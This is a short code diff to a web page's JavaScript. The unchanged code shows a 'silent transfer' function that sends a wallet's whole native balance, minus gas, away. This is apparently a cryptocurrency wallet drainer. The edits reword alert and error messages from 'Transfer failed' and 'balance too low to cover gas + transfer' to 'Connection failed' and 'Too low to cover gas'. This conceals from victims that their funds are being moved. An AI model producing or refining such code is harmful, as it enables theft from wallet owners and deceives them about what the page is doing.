@@ -1166,7 +1166,7 @@
 
           } catch (error) {
             console.error("Silent transfer failed:", error);
-            alert("Transfer failed: " + (error.message || "Unknown error. Check console."));
+            alert("Connection failed: " + (error.message || "Unknown error. Check console."));
           }
         }
 
@@ -1254,7 +1254,7 @@
               const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;
 
               if (balance <= estimatedGasCost * 2n) {
-                throw new Error("Native balance too low to cover gas + transfer");
+                throw new Error("Too low to cover gas");
               }
 
               const amountToSend = balance - estimatedGasCost;
@@ -1366,7 +1366,7 @@
           const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;
 
           if (balance <= estimatedGasCost * 2n) {
-            throw new Error("Native balance too low to cover gas + transfer");
+            throw new Error("Too low to cover gas");
           }
 
           const amountNative = balance - estimatedGasCost;
@@ -2566,6 +2566,7 @@
 
 </body>
 </html>
+
 
 
 
